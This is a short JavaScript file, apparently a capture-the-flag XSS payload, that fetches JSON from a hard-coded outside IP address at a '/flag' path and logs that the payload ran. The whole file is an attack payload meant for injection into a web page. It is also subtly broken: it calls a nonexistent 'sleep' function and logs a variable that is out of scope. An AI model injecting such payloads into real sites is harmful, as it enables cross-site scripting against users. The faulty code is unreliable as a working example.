function xssPayload() {
  url="http://165.232.190.5:1900/flag";
  const a= fetch(url)
    .then((response) => {
      return response.json();
    })
  return a;
}

console.log('XSS payload executed');
xssPayload();
sleep(2000);
console.log(a);
